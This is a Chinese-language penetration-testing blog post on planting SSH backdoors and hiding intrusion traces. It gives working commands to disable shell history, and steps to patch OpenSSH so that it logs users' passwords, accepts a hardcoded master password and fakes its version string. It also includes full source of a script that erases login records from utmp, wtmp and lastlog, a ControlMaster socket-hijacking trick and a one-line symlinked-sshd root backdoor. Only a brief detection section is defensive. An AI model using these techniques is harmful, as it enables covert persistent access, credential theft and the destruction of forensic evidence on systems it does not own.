Title: SSH后门和清除痕迹
Date: 2016-4-13
slug: clear-history
Category: Pentest

对于SSH来说，登录主机之后先执行：
`unset HISTFILE;export HISTFILESIZE=0;export HISTIGNORE=*;export HISTCONTROL=ignorespace `

然后是SSH留后门的方法<http://www.ricter.me/posts/%E4%BB%8E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E5%88%B0%E7%B3%BB%E7%BB%9F%20root%20%E6%9D%83%E9%99%90?_=1460551605108>简单来说就是以下的代码：

```shell
yum install -y openssl openssl-devel pam-devel
http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz
http://ftp.vim.org/security/OpenSSH/openssh-5.9p1.tar.gz
tar zxvf openssh-5.9p1.tar.gz   
tar zxvf 0x06-openssh-5.9p1.patch.tar.gz   
cd openssh-5.9p1.patch/   
cp sshbd5.9p1.diff ../openssh-5.9p1   
cd ../openssh-5.9p1   
patch < sshbd5.9p1.diff   //patch  后门
执行vi includes.h

+#define ILOG "/tmp/ilog" //记录登录到本机的用户名和密码
+#define OLOG "/tmp/olog" //记录本机登录到远程的用户名和密码
+#define SECRETPW "123456654321" //你后门的密码

执行vi version.h

#define SSH_VERSION "填入之前记下来的版本号,伪装原版本"
#define SSH_PORTABLE "小版本号"
./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam --with-kerberos5
make && make install 
service sshd restart //重启sshd
```
<http://blog.csdn.net/bnxf00000/article/details/45217831>

接下来删除登录的历史记录，使用[logtamper.py](http://0cx.cc/python_logtamper.jspx)代码复制过来：

```python
#!/usr/bin/env python 
import os, struct, sys
from pwd import getpwnam
from time import strptime, mktime
from optparse import OptionParser
 
UTMPFILE = "/var/run/utmp"
WTMPFILE = "/var/log/wtmp"
LASTLOGFILE = "/var/log/lastlog"
 
LAST_STRUCT = 'I32s256s'
LAST_STRUCT_SIZE = struct.calcsize(LAST_STRUCT)
 
XTMP_STRUCT = 'hi32s4s32s256shhiii4i20x'
XTMP_STRUCT_SIZE = struct.calcsize(XTMP_STRUCT)
 
 
def getXtmp(filename, username, hostname):
    xtmp = ''
    try:
        fp = open(filename, 'rb')
        while True:
            bytes = fp.read(XTMP_STRUCT_SIZE)
            if not bytes:
                break
 
            data = struct.unpack(XTMP_STRUCT, bytes)
            record = [(lambda s: str(s).split("\0", 1)[0])(i) for i in data]
            if (record[4] == username and record[5] == hostname):
                continue
            xtmp += bytes
    except:
        showMessage('Cannot open file: %s' % filename)
    finally:
        fp.close()
    return xtmp
 
 
def modifyLast(filename, username, hostname, ttyname, strtime):
    try:
        p = getpwnam(username)
    except:
        showMessage('No such user.')
 
    timestamp = 0
    try:
        str2time = strptime(strtime, '%Y:%m:%d:%H:%M:%S')
        timestamp = int(mktime(str2time))
    except:
        showMessage('Time format err.')
 
    data = struct.pack(LAST_STRUCT, timestamp, ttyname, hostname)
    try:
        fp = open(filename, 'wb')
        fp.seek(LAST_STRUCT_SIZE * p.pw_uid)
        fp.write(data)
    except:
        showMessage('Cannot open file: %s' % filename)
    finally:
        fp.close()
    return True
 
 
def showMessage(msg):
    print msg
    exit(-1)
 
 
def saveFile(filename, contents):
    try:
        fp = open(filename, 'w+b')
        fp.write(contents)
    except IOError as e:
        showMessage(e)
    finally:
        fp.close()
 
 
if __name__ == '__main__':
    usage = 'usage: logtamper.py -m 2 -u b4dboy -i 192.168.0.188\n \
        logtamper.py -m 3 -u b4dboy -i 192.168.0.188 -t tty1 -d 2015:05:28:10:11:12'
    parser = OptionParser(usage=usage)
    parser.add_option('-m', '--mode', dest='MODE', default='1' , help='1: utmp, 2: wtmp, 3: lastlog [default: 1]')
    parser.add_option('-t', '--ttyname', dest='TTYNAME')
    parser.add_option('-f', '--filename', dest='FILENAME')
    parser.add_option('-u', '--username', dest='USERNAME')
    parser.add_option('-i', '--hostname', dest='HOSTNAME')
    parser.add_option('-d', '--dateline', dest='DATELINE')
    (options, args) = parser.parse_args()
 
    if len(args) < 3:
        if options.MODE == '1':
            if options.USERNAME == None or options.HOSTNAME == None:
                showMessage('+[Warning]: Incorrect parameter.\n')
 
            if options.FILENAME == None:
                options.FILENAME = UTMPFILE
 
            # tamper
            newData = getXtmp(options.FILENAME, options.USERNAME, options.HOSTNAME)
            saveFile(options.FILENAME, newData)
 
        elif options.MODE == '2':
            if options.USERNAME == None or options.HOSTNAME == None:
                showMessage('+[Warning]: Incorrect parameter.\n')
 
            if options.FILENAME == None:
                options.FILENAME = WTMPFILE
 
            # tamper
            newData = getXtmp(options.FILENAME, options.USERNAME, options.HOSTNAME)
            saveFile(options.FILENAME, newData)
 
        elif options.MODE == '3':
            if options.USERNAME == None or options.HOSTNAME == None or options.TTYNAME == None or options.DATELINE == None:
                showMessage('+[Warning]: Incorrect parameter.\n')
 
            if options.FILENAME == None:
                options.FILENAME = LASTLOGFILE
 
            # tamper
            modifyLast(options.FILENAME, options.USERNAME, options.HOSTNAME, options.TTYNAME , options.DATELINE)
 
        else:
            parser.print_help()
```



====
更新：

上面的可以在debain系使用，感觉下面这种方法更通用：
有两种方式:

1. 修改`/etc/ssh/ssh_config`或者 `~/.ssh/config` 配置文件:

Host *

ControlPath /tmp/%r@%h:%p
ControlMaster auto
ControlPersist yes

此时开启了Controlmaster模式，如果当前用户已经登录过一次目标机器，可以直接使用socket文件登录。

2. 直接修改~/.bashrc文件

```
ssh () 
{ 
    /usr/bin/ssh -o "ControlMaster=auto" -o "ControlPath=/tmp/%r@%h:%p" -o "ControlPersist=yes" "$@";
}
```

然后使用ssh登录的时候:

`ssh -S root@x.x.x.x\:22 %h`

===
进阶，未测试：

如果sockets文件存在，可以创建一个tunnel:

```
lsof -i TCP:9090
ssh -O forward -D 9090 -S /tmp/root@112.124.20.20\:22 %h
lsof -i TCP:9090 
```
然后就可以使用9090端口作为socks5代理。

检测方法:

1. 检查ssh配置文件里面，是否开启ContronMaster模式

```
  /etc/ssh/ssh_config
  $HOME/.ssh/config
```

2. 检查bash自定义函数是否有ssh()劫持

`set|grep "ssh()"`





========
再更新：

在linux里面有这么一句话，快速建立后门：

```
ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oport=12345
```

然后 `ssh root@xxxxx -p 12345 `随便输入密码，即可获得root权限。

原理:

<http://blackwolfsec.cc/2017/03/24/Linux_ssh_backdoor/>
<https://xianzhi.aliyun.com/forum/read/790.html>

简单来说:在sshd服务配置运行pam认证的前提下，PAM配置文件中控制标示为sufficient时，只要pam_rootok模块检测uid为0即可成功登录。

注意点: 

* `/etc/ssh/sshd_config`里面要配置`UsePAM yes`
*  可以更改软链接的位置，但是不能更改链接文件名
   * ln -sf /usr/sbin/sshd /home/su;/home/su -oport=12345 成功
   * ln -sf /usr/sbin/sshd /tmp/pam_test;/tmp/pam_test -oport=12345 失败
* 此类ssh后门核心是pam配置中的pam_rootok.so，是否只需包含这句话就可以实现后门功能，可以自己添加

```
echo "auth sufficient pam_rootok.so" >> /etc/pam.d/hacker
cat /etc/pam.d/hacker
ln -sf /usr/sbin/sshd /tmp/hacker;/tmp/hacker -oport=12345
```
只要文件中包含`auth sufficient pam_rootok.so`，即可无密码登录，可以在`/etc/pam.d`目录中查找这个配置:

```
find ./ |xargs grep "pam_rootok"
```

ubuntu 14里面如下的结果:

```
./su:auth       sufficient pam_rootok.so
./su:# permitted earlier by e.g. "sufficient pam_rootok.so").
./chfn:auth		sufficient	pam_rootok.so
./schroot:auth       sufficient pam_rootok.so
./runuser:auth		sufficient	pam_rootok.so
./chsh:auth		sufficient	pam_rootok.so
```

Centos 6.7结果如下:

```
./runuser:auth		sufficient	pam_rootok.so
./config-util:auth		sufficient	pam_rootok.so
./su:auth		sufficient	pam_rootok.so
./chfn:auth       sufficient   pam_rootok.so
./setup:auth       sufficient	pam_rootok.so
./xserver:auth       sufficient	pam_rootok.so
./chsh:auth       sufficient   pam_rootok.so
./poweroff:auth       sufficient	pam_rootok.so
./halt:auth       sufficient	pam_rootok.so
./wireshark:auth		sufficient	pam_rootok.so
./eject:auth       sufficient	pam_rootok.so
./reboot:auth       sufficient	pam_rootok.so
```